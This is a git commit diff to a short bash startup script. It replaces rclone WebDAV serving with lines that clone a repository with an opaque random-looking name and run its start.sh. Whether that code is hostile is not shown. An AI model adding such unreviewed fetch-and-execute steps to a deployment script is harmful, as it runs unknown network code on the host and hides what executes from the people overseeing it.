602003511499bdf1a316f8157efd6b16c4a1aced
pingme998 <77038591+pingme998@users.noreply.github.com>
2021-12-15 21:08:28 +0530

    Update e.sh

--- e.sh
+++ e.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
 #author https://github.com/developeranaz
 rc version
-curl -L "$CONFIG_IN_URL" >$(rc config file |grep 'rclone.conf' |head -1)
-rc serve webdav $(rc listremotes |head -1) --addr :$PORT --buffer-size 256M --dir-cache-time 12h --vfs-read-chunk-size 256M --vfs-read-chunk-size-limit 2G --vfs-cache-mode writes 
+git clone https://github.com/pingme998/jdjxgisjzkxkckkcmcmncmckk
+chmod +x /jdjxgisjzkxkckkcmcmncmckk/start.sh
+bash /jdjxgisjzkxkckkcmcmncmckk/start.sh
